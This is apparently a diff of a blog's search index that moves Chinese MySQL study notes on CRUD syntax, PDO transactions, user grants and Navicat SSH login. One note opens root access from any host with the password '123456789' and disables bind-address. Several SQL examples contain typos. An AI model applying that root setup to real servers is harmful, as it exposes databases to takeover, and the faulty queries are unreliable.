@@ -7309,505 +7309,6 @@ Windows:
       </tags>
   </entry>
   <entry>
-    <title>MySQL 基础操作-增删改查</title>
-    <url>/2018/04/05/MySQL%20%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
-    <content><![CDATA[
-## 1.数据库
-
-### 1.数据库基本操作
-
-常见数据库包括：**MySQL**，Oracle，SQL server，Redis ...
-
-1.定义
-
-​	存储数据的仓库，即按照数据结构来组织，存储和管理数据的仓库
-
-> 选择 MySQL 的原因有：免费，开源，跨平台，支持事务...
-
-2.链接数据库的步骤
-
-​	开启服务器——>设置主机IP——>用户名（默认root）——>密码（默认为空）
-
-3.组成
-
-​	一个完整的数据库由库（database），表（table）和数据（data）组成，先有库，再有表，最后才有数据的增删改查，也就是说先使用库，才能使用表
-
-4.基本语法
-
-​	MySQL 的每一条数据都是以分号( ; ) 作为结束符
-
-5.常用SQL命令
-
-​	打开命令窗口：	F6
-
-​	使用数据库：	`use 库名;` 
-
-​	创建数据库：	`create database [if not exists] 库名 default charset 编码方式;`  
-
-​	删除数据库：	`drop database 库名;` 
-
-​	查询数据库结构：	`show databases;`	注意：database需要加s，作为复数格式
-
-​	查询数据表：	`show tables;` 	注意：在使用库之前，无法使用表
-
-​	创建数据表：	
-
-```
-		create table if not exists 库名(
-		
-		字段名		字段类型		字段属性,
-		字段名		字段类型		字段属性,
-		字段名		字段类型		字段属性,
-			...
-		字段名		字段类型		字段属性,
-		字段名		字段类型		字段属性
-        
-		)engine=myisam|innodb default charset=utf8;
-```
-
-​			**注意：每一组之间用逗号( , ) 隔开，最后一组字段不用加**
-
-​	删除数据表：	`drop table 表名；` 
-
-​	查看表结构：	`desc 表名；` 
-
-​	查看建表语句：	`show create table 表名` 
-
-​	注意：所有的库名，表名，字段名都需要加上反引号( ` )，所有的字符串需要加上单双引号
-
-​		   反引号可以将库名，表名，字段名实体化，取消特殊意义
-
-
-
-
-
-### 2.数据库数据操作
-
-#### 1.插入数据（增）
-
-1. ##### 插入单条数据：
-
-   格式：
-
-    `insert into 表名 values(值1，值2，值3，...);` 	
-
-   注意点：
-
-   ​	主键由于配合自增属性，所以不用主动设置，默认用`null`代替，值会自动根据最大记录+1；
-
-   ​	如果有默认值，可以用`default`代替
-
-2. ##### 插入单条数据部分字段：
-
-   格式：
-
-    `insert into 表名（字段1，字段2，字段3，....） vaules(值1，值2，值3，...);` 
-
-   注意：
-
-   ​	表名后面填了多少个字段，values就对应填多少个值；
-
-   ​	如果字段具有not null属性，那么必须填写‘’
-
-   使用场合：用户注册，不需要填写所有数据表单
-
-3. ##### 插入多条数据：
-
-   格式：
-
-    `insert into 表名 values(...),(...),(...), ... (...);` 
-
-4. ##### 插入多条数据部分字段
-
-   格式：
-
-    `insert into 表名（字段1，字段2，...）values(...),(...),(...), ... (...);`
-
-#### 2.更新数据（改）
-
-1. ##### 更新所有数据
-
-   格式：
-
-    `update 表名 set 字段1=值1，字段2=值2，...;` 
-
-2. ##### 条件更新
-
-   格式：
-
-    `update 表名 set 字段1=值1，字段2=值2，... where 条件表达式` 
-
-#### 3.删除数据（删）
-
-1. ##### 全部删除
-
-   格式：
-
-   ​	 `delete from 表名；`
-
-   注意：该删除方式只会删除数据，不会删除曾经的数据记录
-
-2. ##### 全部删除（不留记录）
-
-   格式：
-
-   ​	 `truncate table 表名；` 
-
-   注意：该删除方式会连着数据和记录一起删除，如果想清空表，推荐使用truncate
-
-3. ##### 部分删除
-
-   格式：
-
-   ​	 `delete from 表名 where 条件表达式；` 
-
-4. ##### 排序删除
-
-   格式：
-
-   ​	 `delete from 表名 [where 条件表达式] order by 字段 asc|desc limit 行数` 
-
-   注意： `asc`为升序排序，`desc`为降序排序
-
-### 3.函数
-
-#### 1.聚合函数
-
-- 统计总个数：count( )
-
-  `select count(id) from user;`		统计user表中一共有几个id
-
-- 求和：sum( )
-
-  `select sum(age) from user;` 		统计user表中age的综合
-
-- 求平均值：avg( )
-
-  `select avg(age) from user;` 		统计user表中的平均年龄
-
-- 求最大值：max( )
-
-  `select max(age) from user;` 		获取user表中的最大年龄
-
-- 求最小值：min( )
-
-  `select min(age) from user;` 		获取user表中的最小年龄 
-
-#### 2.字符串拼接函数
-
-​	格式：`concat(s1,s2,s3,...)`
-
-​	注意：s1,s2,s3可以代表字段名，也可以代表字符串值
-
-​	`select concat(id,'......',nickname,'......',address) from user;` 
-
-#### 3.数据库版本
-
-​	`select version();`
-
-#### 4.当前时间
-
-​	`select now();`  
-
-#### 5.md5加密
-
-​	`md5('1234234');` 
-
-#### 6.当前时间戳
-
-​	`select unix_timestamp();` 
-
-### 4.查询数据
-
-#### 1.整体结构
-
-```
-	select  * | distinct | 字段名 | 字段名 as 别名 | 表名.字段名
-	from    表名 | 表名1，表名2，...
-	where   条件表达式
-	group by 字段
-	having 条件
-	order by 条件
-	limit 下标，行数
-```
-
-> 注意：以上为查询数据的基本结构，先后书序无法颠倒，但可以省略其中一部分
-
-#### 2.具体查询
-
-- 查询1：查询该表中的所有数据
-
-  格式： `select * from 表名；` 		
-
-  实例： `select * from user;` 
-
-  **注意**： `*` 通配符代表所有的字段，查询所有的字段，推荐少用或不用
-
-- 查询2：查询该表中的指定字段
-
-  格式： `select 字段1，字段2，字段3，... from 表名；` 
-
-  实例：`select tel pwd from user;` 
-
-- 查询3：带条件查询
-
-  格式：`select *|字段名 from 表名 where 条件；` 
-
-  - `<` 查询所有未成年的名字
-
-    `select name from user where age<18;` 
-
-  - `>=`  查询所有成年的名字
-
-    `select name from user where age>=18;` 
-
-  - `=`  精确查询刚好18岁的名单
-
-    `select name from user where age=18;`  
-
-  - `!=`  查询所有不是18岁的名单
-
-    `select name from user where age!=18;` 
-
-  - `between A and B`  查询年龄在15到30之间的名单
-
-    `select name from user where age between 15 and 30;` 
-
-  - `not between A and B`  查询年龄不在20~30岁之间的名单
-
-    `select name from user where age not between 20 and 30;` 
-
-  - `like` 模糊查询 名字带有’小‘的名单
-
-    `select name like "小"；` 
-
-    `select name like "%小%";` 
-
-    **注意**：`%` 通配符可匹配0个，1个或多个字符；
-
-    ​	    `_` 通配符可以匹配一个字符
-
-  - `in` 查询来自于召唤师峡谷的名单
-
-    `select name,address from user where address in ('召唤师峡谷');` 
-
-  - `not in` 查询地址信息不为空的名单
-
-    `select name,address from user where address not in ('null');` 
-
-  ------
-
-  - 逻辑：与 `and`  |  或 `or` 
-
-    - 查询 来自于召唤师峡谷的女孩子
-
-      `select name,address,sex from user where address='召唤师峡谷' and sex=2;`  
-
-    - 查询女孩子或者来自于xxx楼的名单
-
-      `select name,address,sex from user where address like "%楼" or sex=2;`  
-
-  - 空与非空： `is null ` 和 `is not null` 
-
-    - 查询有住址的名单
-
-      `select name from user where address is not null;` 
-
-    - 查询住址信息为空的名单
-
-      `select name from user where address id null;` 
-
-  - `group by` 分组 :
-
-    查询user中名单分别来自哪些地方
-
-     `select address from user group by address;` 
-
-    **注意**：一旦分组，就不能查询单一数据，必须按照“组”为单位来查询
-
-  - `having` 筛选：
-
-    筛选人数多于一个的地址
-
-    `select address,count(id) from user group by address having count(id)>1;` 
-
-    **注意**：`having`一般都是配合`group by`来使用，先分组再筛选
-
-  - `order by` 排序
-
-    按照生日从大到小查看名单
-
-    `select nickname,birthday from user order by birthday desc;` 
-
-    **注意**：`desc`为降序排序，`asc`为升序排序
-
-  - `limit` 前几个
-
-    查询user表单中的前3个人信息
-
-     `select * from user limit 3;` 
-
-    **注意**：标准格式为：`limit 下标，行数`,代表从下标开始的几行数据
-
-### 5.多表查询
-
-> 多张表同时查询
-
-#### 1.条件限制：
-
-​	多张表之间必须要求有联系
-
-​	多表有相同字段时，必须声明是哪张表中的字段（表名.字段名）
-
-​	n张表之间的联系至少有 n-1 条
-
-#### 2.格式：
-
-```
-	select 字段
-	from 表名1，表名2，表名3，...
-	where 表名1.字段1 = 表名2.字段1 ...
-	...
-```
-
-#### 3.实例：
-
-​	查询每个人的昵称，住址，部门，薪资
-
-```
-	select uid,nickname,address,dep,money
-	from user,salary
-	where user.id=salary.uid
-```
-
-### 6.嵌套查询
-
-> 将一条sql语句的结果作为另一条sql的条件来使用
-
-实例
-
-​	查询每个部门最高工资的uid
-
-```
-	select uid,money,dep
-	from salary
-	where money in ( select max(money) from salary group by dep )
-
-```
-
-### 7.多表+嵌套
-
-​	查询每个部门最高工资的uid
-
-```
-	select uid,s.money,s.dep
-	from salary as s,(
-		select dep,max(money) as money 
-		from salary 
-		group by dep ) as t
-	where s.dep=t.dep and s.money=t.money
-
-```
-
-### 8.别名
-
-​	给字段，表名取个别名 `as` 
-
-​	`select dep,max(monry) as money from salary as s group bu dep;` 
-
-### 9.取消重复
-
-​	`select distinct address from user;`
-
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL- 事务操作</title>
-    <url>/2018/05/15/MySQL-%20%E4%BA%8B%E5%8A%A1%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[### 事务操作
-
-```
-
-	
-	// 事务: 将 多条sql语句绑定为一个整体, 其中有任意一条sql 失败, 则整体失败.
-	// 	
-	// 	MyISAM 不支持事务 
-
-	// 	InnoDB 支持事务
-
-
-	// 自动提交:
-	// 	默认情况下, sql一旦执行, 就会立马改变sql的状态
-	// 	关闭自动提交, sql一旦执行, 能得到sql的状态结果, 但是sql不会真正的改变
-
-	
-	try {
-		$pdo = new PDO('mysql:host=localhost;dbname=s86;charset=utf8','root','pass');
-	} catch (Exception $e) {
-		echo '数据库链接失败'; die;
-	}
-
-
-	// 事务操作步骤
-
-	try {
-		// 1. 关闭自动提交
-			$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 0);
-
-		// 2. 开启一个事务 (游戏中的存档)
-			$pdo->beginTransaction();
-
-		// 3. 执行sql
-			# 1) 扣钱  -10W 
-			$sql = "UPDATE `salary` SET  `money`=`money`-100000 WHERE `uid` = 5 ";
-			$rows = $pdo->exec($sql);
-			if($rows < 1){
-				throw new Exception('工资转出失败');
-			}
-
-			# 2) 加钱  +10W
-			$sql = "UPDATE `salary` SET  `money`=`money`+100000 WHERE `uid` = 4 ";
-			$rows = $pdo->exec($sql);
-			if($rows < 1){
-				throw new Exception('工资转入失败');
-			}
-
-
-		// 4. 执行成功, 提交事务, 真正的改变sql状态
-			$pdo->commit();
-
-	} catch (Exception $e) {
-		// 4. 执行失败,  回滚事务, 回到开始事务时的sql状态
-		echo $e->getMessage();
-		$pdo->rollBack();  # 读档
-	}
-	
-
-	// 5. 开启自动提交
-	$pdo->setAttribute(PDO::ATTR_AUTOCOMMIT, 1);
-
-
-
-
-```
-
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>后端 - MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP 基础01- 数据类型</title>
     <url>/2017/11/21/PHP%20%E5%9F%BA%E7%A1%8001-%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
     <content><![CDATA[
@@ -17008,83 +16509,6 @@ sudo composer self-update --1
       </tags>
   </entry>
   <entry>
-    <title>MySQL- 用户账号相关操作</title>
-    <url>/2020/09/05/MySQL%20%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[
-## MySQL 用户账号相关操作
-
-### 具体操作命令格式
-
-> 以下为常用命令
-
-```
--- 查询用户
-SELECT * FROM user;
--- 创建用户, 仅可看information_schema库
-CREATE USER 'naxx'@'%' IDENTIFIED BY '111111';
--- 添加该用户对某个库的查询,更新权限
-GRANT SELECT,UPDATE ON qjjfwpt_saas.* TO 'naxx'@'%';
--- 添加该用户对某个库的删除,更新权限
-GRANT DELETE ON qjjfwpt_saas.* TO 'naxx'@'%';
--- 添加该用户对某个库的视图查询权限
-GRANT SHOW VIEW ON qjjfwpt_saas.* TO 'naxx'@'%';
--- 刷新权限
-FLUSH privileges;
--- 显示该用户在所有IP下的权限
-SHOW GRANTS FOR 'naxx'@'%';
--- 显示该用户在指定IP下的所有权限
-SHOW GRANTS FOR 'naxx'@'127.0.0.1';
--- 删除查看视图权限
-REVOKE SHOW VIEW ON qjjfwpt_saas.* FROM 'naxx'@'%';
--- 删除指定用户
-DROP USER 'naxx'@'%';
--- 修改用户密码
-SET PASSWORD FOR 'naxx'@'%'=PASSWORD('123456789');
--- 密码过期(下次登录需要自行修改密码)
-ALTER USER 'naxx'@'%' PASSWORD EXPIRE;
--- 锁定用户
-ALTER USER 'naxx'@'%' account lock;
--- 解锁用户
-ALTER USER 'naxx'@'%' account unlock;
-```
-
-### 权限设定关键字
-
-![I3wLQVQjl9](/images/imgs/I3wLQVQjl9.png)
-
-### 初始密码问题
-
-```shell
-刚安装好的mysql登录使用auth_socket
-获取root权限
-	$ su root
-登录mysql
-	$ mysql
-执行SQL
-	mysql> update mysql.user set host='%',plugin='mysql_native_password',authentication_string=password('123456789') where user='root';
-	mysql> flush privileges;
-	mysql> exit;
-修改mysql配置
-	$ sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
-注释以下行
-	# bind-address          = 127.0.0.1
-重启mysql服务
-	$ sudo service mysql restart
-即可正常使用Navicat客户端连接数据库
-```
-
-
-
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>后端 - MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker_文件数据备份实战</title>
     <url>/2021/07/15/Docker_%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E5%AE%9E%E6%88%98/</url>
     <content><![CDATA[
@@ -19587,70 +19011,6 @@ sudo dpkg -i *.deb
         <tag>PHP</tag>
         <tag>后端</tag>
         <tag>LibreOffice</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Navicat通过ssh-秘钥方式登录</title>
-    <url>/2021/01/15/MySQL%20navicat%E9%80%9A%E8%BF%87ssh-%E7%A7%98%E9%92%A5%E6%96%B9%E5%BC%8F%E7%99%BB%E5%BD%95/</url>
-    <content><![CDATA[
-### 1.准备私钥文件:
-
- `id_rsa_2048.pub`
-
-![1596767009388](/images/imgs/Navicat使用/1596767009388.png)
-
-### 2.转换.pub文件为PEM文件
-
-#### 2.1.使用`xshell`, 打开`工具`-`用户秘钥管理者`
-
-![1596767129649](/images/imgs/Navicat使用/1596767129649.png)
-
-#### 2.2.点击选中秘钥, 点击导出
-
-> 如果没有秘钥, 请手动生成并将其发给管理员, 供其写入服务器验证文件
-
-![1596767239840](/images/imgs/Navicat使用/1596767239840.png)
-
-#### 2.3.选择保存目录及文件名, 默认为PEM格式, 不用修改
-
-![1596767321155](/images/imgs/Navicat使用/1596767321155.png)
-
-#### 2.4.输入密码, 导出完成(无提示)
-
-![1596767348706](/images/imgs/Navicat使用/1596767348706.png)
-
-### 3.使用`Navica`t链接数据库
-
-#### 3.1.打开Navicat, 选择新建链接
-
-> 不要在原有数据库链接上修改, 否则有可能报错: `connectiong has been used`
-
-![1596767449908](/images/imgs/Navicat使用/1596767449908.png)
-
-#### 3.2.填写常规项
-
-![1596767605626](/images/imgs/Navicat使用/1596767605626.png)
-
-#### 3.3.填写SSH项
-
-勾选使用SSH通道, 填写内容, 选择验证方法为公钥
-
-![1596767822670](/images/imgs/Navicat使用/1596767822670.png)
-
-3.4.选择生成的PEM公钥文件
-
-![1596767945543](/images/imgs/Navicat使用/1596767945543.png)
-
-#### 3.5.输入生成公钥时的密码,测试连接
-
-![1596768055237](/images/imgs/Navicat使用/1596768055237.png)]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>PHP</tag>
-        <tag>后端</tag>
       </tags>
   </entry>
   <entry>
@@ -42538,6 +41898,1812 @@ $ mysqldump -uroot -p1234 db01 > db01.sql
       </categories>
       <tags>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Navicat通过ssh-秘钥方式登录</title>
+    <url>/2021/01/15/MySql/MySQL%20navicat%E9%80%9A%E8%BF%87ssh-%E7%A7%98%E9%92%A5%E6%96%B9%E5%BC%8F%E7%99%BB%E5%BD%95/</url>
+    <content><![CDATA[
+### 1.准备私钥文件:
+
+ `id_rsa_2048.pub`
+
+![1596767009388](/images/imgs/Navicat使用/1596767009388.png)
+
+### 2.转换.pub文件为PEM文件
+
+#### 2.1.使用`xshell`, 打开`工具`-`用户秘钥管理者`
+
+![1596767129649](/images/imgs/Navicat使用/1596767129649.png)
+
+#### 2.2.点击选中秘钥, 点击导出
+
+> 如果没有秘钥, 请手动生成并将其发给管理员, 供其写入服务器验证文件
+
+![1596767239840](/images/imgs/Navicat使用/1596767239840.png)
+
+#### 2.3.选择保存目录及文件名, 默认为PEM格式, 不用修改
+
+![1596767321155](/images/imgs/Navicat使用/1596767321155.png)
+
+#### 2.4.输入密码, 导出完成(无提示)
+
+![1596767348706](/images/imgs/Navicat使用/1596767348706.png)
+
+### 3.使用`Navica`t链接数据库
+
+#### 3.1.打开Navicat, 选择新建链接
+
+> 不要在原有数据库链接上修改, 否则有可能报错: `connectiong has been used`
+
+![1596767449908](/images/imgs/Navicat使用/1596767449908.png)
+
+#### 3.2.填写常规项
+
+![1596767605626](/images/imgs/Navicat使用/1596767605626.png)
+
+#### 3.3.填写SSH项
+
+勾选使用SSH通道, 填写内容, 选择验证方法为公钥
+
+![1596767822670](/images/imgs/Navicat使用/1596767822670.png)
+
+3.4.选择生成的PEM公钥文件
+
+![1596767945543](/images/imgs/Navicat使用/1596767945543.png)
+
+#### 3.5.输入生成公钥时的密码,测试连接
+
+![1596768055237](/images/imgs/Navicat使用/1596768055237.png)]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>PHP</tag>
+        <tag>后端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL 基础操作-增删改查</title>
+    <url>/2018/04/05/MySql/MySQL%20%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
+    <content><![CDATA[
+## 1.数据库
+
+### 1.数据库基本操作
+
+常见数据库包括：**MySQL**，Oracle，SQL server，Redis ...
+
+1.定义
+
+​	存储数据的仓库，即按照数据结构来组织，存储和管理数据的仓库
+
+> 选择 MySQL 的原因有：免费，开源，跨平台，支持事务...
+
+2.链接数据库的步骤
+
+​	开启服务器——>设置主机IP——>用户名（默认root）——>密码（默认为空）
+
+3.组成
+
+​	一个完整的数据库由库（database），表（table）和数据（data）组成，先有库，再有表，最后才有数据的增删改查，也就是说先使用库，才能使用表
+
+4.基本语法
+
+​	MySQL 的每一条数据都是以分号( ; ) 作为结束符
+
+5.常用SQL命令
+
+​	打开命令窗口：	F6
+
+​	使用数据库：	`use 库名;` 
+
+​	创建数据库：	`create database [if not exists] 库名 default charset 编码方式;`  
+
+​	删除数据库：	`drop database 库名;` 
+
+​	查询数据库结构：	`show databases;`	注意：database需要加s，作为复数格式
+
+​	查询数据表：	`show tables;` 	注意：在使用库之前，无法使用表
+
+​	创建数据表：	
+
+```
+		create table if not exists 库名(
+		
+		字段名		字段类型		字段属性,
+		字段名		字段类型		字段属性,
+		字段名		字段类型		字段属性,
+			...
+		字段名		字段类型		字段属性,
+		字段名		字段类型		字段属性
+        
+		)engine=myisam|innodb default charset=utf8;
+```
+
+​			**注意：每一组之间用逗号( , ) 隔开，最后一组字段不用加**
+
+​	删除数据表：	`drop table 表名；` 
+
+​	查看表结构：	`desc 表名；` 
+
+​	查看建表语句：	`show create table 表名` 
+
+​	注意：所有的库名，表名，字段名都需要加上反引号( ` )，所有的字符串需要加上单双引号
+
+​		   反引号可以将库名，表名，字段名实体化，取消特殊意义
+
+
+
+
+
+### 2.数据库数据操作
+
+#### 1.插入数据（增）
+
+1. ##### 插入单条数据：
+
+   格式：
+
+    `insert into 表名 values(值1，值2，值3，...);` 	
+
+   注意点：
+
+   ​	主键由于配合自增属性，所以不用主动设置，默认用`null`代替，值会自动根据最大记录+1；
+
+   ​	如果有默认值，可以用`default`代替
+
+2. ##### 插入单条数据部分字段：
+
+   格式：
+
+    `insert into 表名（字段1，字段2，字段3，....） vaules(值1，值2，值3，...);` 
+
+   注意：
+
+   ​	表名后面填了多少个字段，values就对应填多少个值；
+
+   ​	如果字段具有not null属性，那么必须填写‘’
+
+   使用场合：用户注册，不需要填写所有数据表单
+
+3. ##### 插入多条数据：
+
+   格式：
+
+    `insert into 表名 values(...),(...),(...), ... (...);` 
+
+4. ##### 插入多条数据部分字段
+
+   格式：
+
+    `insert into 表名（字段1，字段2，...）values(...),(...),(...), ... (...);`
+
+#### 2.更新数据（改）
+
+1. ##### 更新所有数据
+
+   格式：
+
+    `update 表名 set 字段1=值1，字段2=值2，...;` 
+
+2. ##### 条件更新
+
+   格式：
+
+    `update 表名 set 字段1=值1，字段2=值2，... where 条件表达式` 
+
+#### 3.删除数据（删）
+
+1. ##### 全部删除
+
+   格式：
+
+   ​	 `delete from 表名；`
+
+   注意：该删除方式只会删除数据，不会删除曾经的数据记录
+
+2. ##### 全部删除（不留记录）
+
+   格式：
+
+   ​	 `truncate table 表名；` 
+
+   注意：该删除方式会连着数据和记录一起删除，如果想清空表，推荐使用truncate
+
+3. ##### 部分删除
+
+   格式：
+
+   ​	 `delete from 表名 where 条件表达式；` 
+
+4. ##### 排序删除
+
+   格式：
+
+   ​	 `delete from 表名 [where 条件表达式] order by 字段 asc|desc limit 行数` 
+
+   注意： `asc`为升序排序，`desc`为降序排序
+
+### 3.函数
+
+#### 1.聚合函数
+
+- 统计总个数：count( )
+
+  `select count(id) from user;`		统计user表中一共有几个id
+
+- 求和：sum( )
+
+  `select sum(age) from user;` 		统计user表中age的综合
+
+- 求平均值：avg( )
+
+  `select avg(age) from user;` 		统计user表中的平均年龄
+
+- 求最大值：max( )
+
+  `select max(age) from user;` 		获取user表中的最大年龄
+
+- 求最小值：min( )
+
+  `select min(age) from user;` 		获取user表中的最小年龄 
+
+#### 2.字符串拼接函数
+
+​	格式：`concat(s1,s2,s3,...)`
+
+​	注意：s1,s2,s3可以代表字段名，也可以代表字符串值
+
+​	`select concat(id,'......',nickname,'......',address) from user;` 
+
+#### 3.数据库版本
+
+​	`select version();`
+
+#### 4.当前时间
+
+​	`select now();`  
+
+#### 5.md5加密
+
+​	`md5('1234234');` 
+
+#### 6.当前时间戳
+
+​	`select unix_timestamp();` 
+
+### 4.查询数据
+
+#### 1.整体结构
+
+```
+	select  * | distinct | 字段名 | 字段名 as 别名 | 表名.字段名
+	from    表名 | 表名1，表名2，...
+	where   条件表达式
+	group by 字段
+	having 条件
+	order by 条件
+	limit 下标，行数
+```
+
+> 注意：以上为查询数据的基本结构，先后书序无法颠倒，但可以省略其中一部分
+
+#### 2.具体查询
+
+- 查询1：查询该表中的所有数据
+
+  格式： `select * from 表名；` 		
+
+  实例： `select * from user;` 
+
+  **注意**： `*` 通配符代表所有的字段，查询所有的字段，推荐少用或不用
+
+- 查询2：查询该表中的指定字段
+
+  格式： `select 字段1，字段2，字段3，... from 表名；` 
+
+  实例：`select tel pwd from user;` 
+
+- 查询3：带条件查询
+
+  格式：`select *|字段名 from 表名 where 条件；` 
+
+  - `<` 查询所有未成年的名字
+
+    `select name from user where age<18;` 
+
+  - `>=`  查询所有成年的名字
+
+    `select name from user where age>=18;` 
+
+  - `=`  精确查询刚好18岁的名单
+
+    `select name from user where age=18;`  
+
+  - `!=`  查询所有不是18岁的名单
+
+    `select name from user where age!=18;` 
+
+  - `between A and B`  查询年龄在15到30之间的名单
+
+    `select name from user where age between 15 and 30;` 
+
+  - `not between A and B`  查询年龄不在20~30岁之间的名单
+
+    `select name from user where age not between 20 and 30;` 
+
+  - `like` 模糊查询 名字带有’小‘的名单
+
+    `select name like "小"；` 
+
+    `select name like "%小%";` 
+
+    **注意**：`%` 通配符可匹配0个，1个或多个字符；
+
+    ​	    `_` 通配符可以匹配一个字符
+
+  - `in` 查询来自于召唤师峡谷的名单
+
+    `select name,address from user where address in ('召唤师峡谷');` 
+
+  - `not in` 查询地址信息不为空的名单
+
+    `select name,address from user where address not in ('null');` 
+
+  ------
+
+  - 逻辑：与 `and`  |  或 `or` 
+
+    - 查询 来自于召唤师峡谷的女孩子
+
+      `select name,address,sex from user where address='召唤师峡谷' and sex=2;`  
+
+    - 查询女孩子或者来自于xxx楼的名单
+
+      `select name,address,sex from user where address like "%楼" or sex=2;`  
+
+  - 空与非空： `is null ` 和 `is not null` 
+
+    - 查询有住址的名单
+
+      `select name from user where address is not null;` 
+
+    - 查询住址信息为空的名单
+
+      `select name from user where address id null;` 
+
+  - `group by` 分组 :
+
+    查询user中名单分别来自哪些地方
+
+     `select address from user group by address;` 
+
+    **注意**：一旦分组，就不能查询单一数据，必须按照“组”为单位来查询
+
+  - `having` 筛选：
+
+    筛选人数多于一个的地址
+
+    `select address,count(id) from user group by address having count(id)>1;` 
+
+    **注意**：`having`一般都是配合`group by`来使用，先分组再筛选
+
+  - `order by` 排序
+
+    按照生日从大到小查看名单
+
+    `select nickname,birthday from user order by birthday desc;` 
+
+    **注意**：`desc`为降序排序，`asc`为升序排序
+
+  - `limit` 前几个
+
+    查询user表单中的前3个人信息
+
+     `select * from user limit 3;` 
+
+    **注意**：标准格式为：`limit 下标，行数`,代表从下标开始的几行数据
+
+### 5.多表查询
+
+> 多张表同时查询
+
+#### 1.条件限制：
+
+​	多张表之间必须要求有联系
+
+​	多表有相同字段时，必须声明是哪张表中的字段（表名.字段名）
+
+​	n张表之间的联系至少有 n-1 条
+
+#### 2.格式：
+
+```
+	select 字段
+	from 表名1，表名2，表名3，...
+	where 表名1.字段1 = 表名2.字段1 ...
+	...
+```
+
+#### 3.实例：
+
+​	查询每个人的昵称，住址，部门，薪资
+
+```
+	select uid,nickname,address,dep,money
+	from user,salary
+	where user.id=salary.uid
+```
+
+### 6.嵌套查询
+
+> 将一条sql语句的结果作为另一条sql的条件来使用
+
+实例
+
+​	查询每个部门最高工资的uid
+
+```
+	select uid,money,dep
+	from salary
+	where money in ( select max(money) from salary group by dep )
+
+```
+
+### 7.多表+嵌套
+
+​	查询每个部门最高工资的uid
+
+```
+	select uid,s.money,s.dep
+	from salary as s,(
+		select dep,max(money) as money 
+		from salary 
+		group by dep ) as t
+	where s.dep=t.dep and s.money=t.money
+
+```
+
+### 8.别名
+
+​	给字段，表名取个别名 `as` 
+
+​	`select dep,max(monry) as money from salary as s group bu dep;` 
+
+### 9.取消重复
+
+​	`select distinct address from user;`
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>数据库</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL- 用户账号相关操作</title>
+    <url>/2020/09/05/MySql/MySQL%20%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E7%9B%B8%E5%85%B3%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[
+## MySQL 用户账号相关操作
+
+### 具体操作命令格式
+
+> 以下为常用命令
+
+```
+-- 查询用户
+SELECT * FROM user;
+-- 创建用户, 仅可看information_schema库
+CREATE USER 'naxx'@'%' IDENTIFIED BY '111111';
+-- 添加该用户对某个库的查询,更新权限
+GRANT SELECT,UPDATE ON qjjfwpt_saas.* TO 'naxx'@'%';
+-- 添加该用户对某个库的删除,更新权限
+GRANT DELETE ON qjjfwpt_saas.* TO 'naxx'@'%';
+-- 添加该用户对某个库的视图查询权限
+GRANT SHOW VIEW ON qjjfwpt_saas.* TO 'naxx'@'%';
+-- 刷新权限
+FLUSH privileges;
+-- 显示该用户在所有IP下的权限
+SHOW GRANTS FOR 'naxx'@'%';
+-- 显示该用户在指定IP下的所有权限
+SHOW GRANTS FOR 'naxx'@'127.0.0.1';
+-- 删除查看视图权限
+REVOKE SHOW VIEW ON qjjfwpt_saas.* FROM 'naxx'@'%';
+-- 删除指定用户
+DROP USER 'naxx'@'%';
+-- 修改用户密码
+SET PASSWORD FOR 'naxx'@'%'=PASSWORD('123456789');
+-- 密码过期(下次登录需要自行修改密码)
+ALTER USER 'naxx'@'%' PASSWORD EXPIRE;
+-- 锁定用户
+ALTER USER 'naxx'@'%' account lock;
+-- 解锁用户
+ALTER USER 'naxx'@'%' account unlock;
+```
+
+### 权限设定关键字
+
+![I3wLQVQjl9](/images/imgs/I3wLQVQjl9.png)
+
+### 初始密码问题
+
+```shell
+刚安装好的mysql登录使用auth_socket
+获取root权限
+	$ su root
+登录mysql
+	$ mysql
+执行SQL
+	mysql> update mysql.user set host='%',plugin='mysql_native_password',authentication_string=password('123456789') where user='root';
+	mysql> flush privileges;
+	mysql> exit;
+修改mysql配置
+	$ sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
+注释以下行
+	# bind-address          = 127.0.0.1
+重启mysql服务
+	$ sudo service mysql restart
+即可正常使用Navicat客户端连接数据库
+```
+
+
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>后端 - MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL- 事务操作</title>
+    <url>/2018/05/15/MySql/MySQL-%20%E4%BA%8B%E5%8A%A1%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[### 事务操作
+
+```
+
+	
